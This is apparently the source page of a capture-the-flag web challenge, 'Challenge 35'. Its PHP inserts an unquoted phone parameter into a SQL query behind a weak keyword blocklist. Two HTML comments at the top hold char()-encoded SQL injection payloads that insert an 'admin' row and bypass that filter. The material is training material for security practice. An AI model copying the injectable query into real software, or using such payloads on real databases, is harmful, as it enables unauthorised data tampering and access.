<!-- 111),(char(97,100,109,105,110),char(50,48,50,46,49,50,48,46,51,54,46,49,55,57),122 -->
<!-- 123), (CHAR(97,100,109,105,110),CHAR(),2 -->

<html>
<head>
<title>Challenge 35</title>
<head>
<body>
<form method=get action=index.php>
phone : <input name=phone size=11><input type=submit value='add'>
</form>
<?php
if ($_GET[phone]) {
    if (eregi("%|\*|/|=|from|select|x|-|#|\(\(", $_GET[phone])) {
        exit("no hack");
    }

    @mysql_query("insert into challenge35_list(id,ip,phone) values('$_SESSION[id]','$_SERVER[REMOTE_ADDR]',$_GET[phone])") or die("query error");
    echo("Done<br>");
}

$admin_ck=mysql_fetch_array(mysql_query("select ip from challenge35_list where id='admin' and ip='$_SERVER[REMOTE_ADDR]'"));

if ($admin_ck[ip]==$_SERVER[REMOTE_ADDR]) {
    @solve();
    @mysql_query("delete from challenge35_list");
}
$phone_list=@mysql_query("select * from challenge35_list where ip='$_SERVER[REMOTE_ADDR]'");

echo("<!--");

while ($d=@mysql_fetch_array($phone_list)) {
    echo("$d[id] - $d[phone]\n");
}

echo("-->");

?>
<br><a href=index.phps>index.phps</a>
<br><br><br>
<center>Thanks to <a href=http://webhacking.kr/index.php?mode=information&id=HellSonic>HellSonic</a></center>
<br><br><br>
</body>
</html>
